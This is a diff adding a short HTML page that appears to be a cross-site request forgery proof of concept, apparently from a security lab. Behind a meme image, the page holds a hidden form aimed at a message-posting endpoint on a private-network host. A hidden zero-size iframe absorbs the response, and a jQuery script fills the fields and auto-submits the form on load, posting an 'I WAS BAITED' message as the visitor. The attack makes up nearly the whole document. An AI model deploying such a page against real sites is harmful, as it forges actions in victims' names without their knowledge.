@@ -1,0 +1,19 @@
+<head>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+</head> 
+<iframe name="devnull" width="0" height="0"> </iframe>
+
+<img src="https://i.kym-cdn.com/photos/images/original/001/047/536/562.png"/>
+
+<form action="http://10.0.23.22/myspray/writemessage92.html" method="post" target="devnull">
+	<input id="Messages_subject" name="subject" value="" class="fieldText" maxlength="70" type="hidden">
+	<input id="Messages_message" rows="10" cols="40" name="message" type="hidden">
+</form>
+
+<script>
+$(document).ready(function(){  
+  $('#Messages_message').val('I clicked on the bait, but I don\'t even know it yet');
+	$('#Messages_subject').val('Automatic message: I WAS BAITED');
+	document.forms[0].submit();
+});
+</script>
